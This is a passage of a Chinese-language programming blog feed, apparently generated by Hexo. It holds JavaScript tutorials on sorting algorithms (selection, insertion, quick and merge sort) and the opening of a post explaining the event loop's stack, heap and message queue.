number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>选择排序即从数组第一个数到倒数第二个数，分别与后面的数中的选出的最值（升序就是最小值）进行比较，满足条件（升序就是大于最小值）就交换位置，然后完成排序。这里可以理解为先<strong>选择</strong>出最小值，然后与前面的数进行比较和交换，就不用像冒泡那样挨个比较和交换了；另外，这里为了交换方便，记录的最值其实是该值在数组中的<strong>索引</strong>，而不是实际值；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">selectSort</span><span class="token punctuation">(</span><span class="token parameter">_arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> arr <span class="token operator">=</span> _arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> minIdx <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> minIdx <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 如果当前值已经是最小值，就可以不用交换，</span>        <span class="token comment">// 避免浪费时间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>minIdx <span class="token operator">!==</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>            arr<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p>插入排序即从第二个到最后一个数，分别与排在前面的有序序列（第一轮该序列只有一个数，肯定是有序的，之后每一轮结束这个有序序列都会增加）中的每个数进行比较，然后<strong>插入</strong>合适的位置使其有序，直到最后一个数插入时完成排序；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">insertSort</span><span class="token punctuation">(</span><span class="token parameter">_arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> arr <span class="token operator">=</span> _arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 先将插入值（当前值）备份，方便后续插入操作</span>        <span class="token keyword">let</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 插入值在有序序列中从右向左比较</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 下面就是“插入”操作的实现：</span>            <span class="token comment">// 如果插入值小于比较值（j-1），则将前面的数向后挪一位，</span>            <span class="token comment">// 这样就可以把被插入的空间留出来了，并且在不断向前移动</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 如果插入值大于或等于比较值，则把插入值放到这个比较值的后面</span>            <span class="token comment">// 也就是之前留出来的插入空间</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p>快速排序在数组中任选一个数（下面选第一个数）作中间值，然后将余下的数分别与其比较，比中间值小则放到左边，否则放右边，然后再进行递归，将放在左边和右边的数组分别作为新数组进行同样的排序操作，直到数组不能再分，最后将所有排序结果合并；这里<strong>快速</strong>可以理解为整个操作过程相比于其他方法简单快捷，找好任一个中间值后便将剩下的数挨个放入其左或右，而不用管左右数组是否有序，直到递归完成就整体有序了，至于排序是否快速就要看情况了；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 方法一：</span><span class="token keyword">function</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> mid <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 基准（中间值）</span>            left <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 放到基准左边的数</span>            right <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 放到基准右边的数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                left<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                right<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 递归分割下去，不能分割时合并左中右数组返回</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">concat</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">quickSort</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 方法二：</span><span class="token keyword">function</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> midIdx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 基准值的索引</span>        <span class="token comment">// 这里执行的就是把值放入基准左边还是右边的操作</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 由于基准是第一个数，并且是从左向右遍历，</span>            <span class="token comment">// 所以后面的遍历值如果小于基准就先删除再 unshift 到最前面，</span>            <span class="token comment">// 这样就实现了“放到左边”，</span>            <span class="token comment">// 如果大于或等于基准就不用管，也就“放到右边”了；</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>midIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                arr<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                midIdx<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> midIdx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">concat</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>midIdx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>midIdx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 经测试方法一比方法二快一些，数组越大相差倍数数量级也越大。</span><span class="token comment">// 显而易见方法一在空间上消耗不少，所以在时间上占优势；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><p>归并排序<strong>递归</strong>地将数组分割为两个部分（左数组与右数组），直到不能再分，然后再定义一个合并函数，负责<strong>递归</strong>地将两部分合并为一个有序数组作为返回值；合并函数其实会是合并两个有序的数组，合并方法便是分别将两数组第一个数取出（删除）放入返回数组中，至于两个数先放哪一个，可以通过比较大小来确定；所以这里的<strong>归并</strong>可以理解为递<strong>归</strong>地合<strong>并</strong>为一个有序序列；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 不能再分时返回数组，执行之后的合并操作</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 将数组分割成两部分</span>        <span class="token keyword">let</span> mid <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> left <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> right <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 递归地合并每次分割的左右数组</span>        <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token function">mergeSort</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 把左右数组合并为一个有序数组的函数</span><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">left<span class="token punctuation">,</span> right</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> left<span class="token punctuation">.</span>length <span class="token operator">+</span> right<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// 分割后左数组为空的情况</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 右数组为空</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 左右数组都不为空</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 较小的元素优先放入</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 不存在左右数组都为空的情况，因为总循环次数为 len</span>        <span class="token comment">// 所以左右数组都空之前已经停止循环了</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 事件循环</title>
      <link href="/2024/09/27/javascript/javascript-shi-jian-xun-huan/"/>
      <url>/2024/09/27/javascript/javascript-shi-jian-xun-huan/</url>
      
        <content type="html"><![CDATA[<h1 id="运行时（runtime）"><a href="#运行时（runtime）" class="headerlink" title="运行时（runtime）"></a>运行时（runtime）</h1><p>一个 JavaScript 运行时包含 <strong>栈(stack), 堆(heap), 队列(queue)</strong>;</p><h1 id="栈-stack"><a href="#栈-stack" class="headerlink" title="栈 (stack)"></a>栈 (stack)</h1><p><strong>栈</strong> 具有 <strong>先进后出 (FILO, First In Last Out)</strong> 的特点，有时也叫做 <strong>堆栈</strong>，可以理解为一个开口向上的容器，先进入的物体压瓶底，后进入的物体一层层向上堆叠，最后取出时，也是一个个拿出来，先拿出最后放进去的，也就是在最上面那个，最后拿出的就是之前第一个放入瓶底的物体；其中容器里的每一个物体叫做 <strong>栈帧</strong>，理解为动画的每一帧，即最小单元；</p><p>动画描述：</p><p><img src="https://i.loli.net/2019/06/19/5d0a3c772749842497.gif" alt="stack_null.gif"></p><p>JavaScript 执行时，每一个调用函数执行时会被压入栈中，称为 <strong>压栈</strong>，这个函数执行完毕后从栈中弹出，称为 <strong>弹栈</strong>；即某个物体放入容器一定时间后，再从容器里面取出来，方便为下一次放入物体腾出空间；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 1.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 0.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Message 0.</span><span class="token comment">// Message 1.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果一个函数执行时还会调用第二个函数，那么第一个函数压入栈底后，随后第二个函数便会压在第一个上面，如果还存在第三个、第四个等等，便以此类推向上堆叠，直到最后调用的一个函数执行完之后，在从后往前一次弹出每一个函数；</p><p>可以理解为容器放入第一个物体后，本来应该随后取出的，但是这个物体又牵连了第二个物体，所以又继续放入第二个，甚至第三个、第四个等等；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 1.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 2.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 3.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 0.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Message 0.</span><span class="token comment">// Message 1.</span><span class="token comment">// Message 2.</span><span class="token comment">// Message 3.</span><span class="token comment">// 可以慢慢看几遍捋一下顺序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>演示动画：</p><p><img src="https://i.loli.net/2019/06/19/5d0a400b56afd25428.gif" alt="stack_fn.gif"></p><p>到这里可能就有问题了，函数能无限调用下去？能无限向栈中压入物体？当然，这个容器是有限制的，例如，在电脑浏览器控制台输入以下代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实就是一个递归函数，不断调用自己，并且一直执行下去，那么不出意外，会弹出如下错误提示：</p><p><img src="https://i.loli.net/2019/06/18/5d08ec91b92e653156.png" alt="stack-exceed-fn.png"></p><p>大致意思就是说执行栈发生了溢出，就是不断调用的函数太多了，超过了栈的规定大小；</p><p>也可以尝试输入以下代码，看一下使用的浏览器的栈的尺寸：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回车之后，在浏览器没有卡死的情况下 -_-，n 分钟之后，应该会出现以下错误提示：</p><p><img src="https://i.loli.net/2019/06/18/5d08ecab407ee90019.png" alt="stack-exceed-num.png"></p><p>最后一个出现的数字应该就是极限了，这里使用的是 Chrome 浏览器，可以看出还是比较大的；</p><h1 id="堆-heap"><a href="#堆-heap" class="headerlink" title="堆 (heap)"></a>堆 (heap)</h1><p><strong>堆</strong> 在运行期间被用来动态分配内存，比如给变量、对象、数组、字符串等分配特定的内存地址，用以访问，不像栈和队列，它是一个非结构化的区域；</p><h1 id="队列-queue"><a href="#队列-queue" class="headerlink" title="队列 (queue)"></a>队列 (queue)</h1><p><strong>队列</strong> 具有 <strong>先进先出 (FIFO, First In First Out)</strong> 的特点，这里就理解为排队取餐的一队人，先到先得，然后从前面先走，后来的排在最后，并且不允许插队；</p><p>在 JavaScript 运行时中，队列的结构被应用到了 <strong>消息队列</strong> 中；前面说到代码执行时，调用函数执行时被压入执行栈 (call stack) 中，并且需要等待该函数彻底执行完后，才能弹出栈，但是假如遇到 <code>setTimeout</code> 这样延时事件，由于 JavaScript 引擎的 <strong>单线程</strong> 特点，区别于其他语言，因此执行是不会因为延时函数而中断的，此时便会将 <code>setTimeout</code> 延时调用的函数放入 <strong>消息队列</strong> 中（延时短的早调用，延时长的晚调用，<strong>与书写顺序无关</strong>），等待当前环境所有压栈、弹栈操作执行完毕，再按照顺序执行队列中的调用函数；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 1.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">delay1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 2.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token 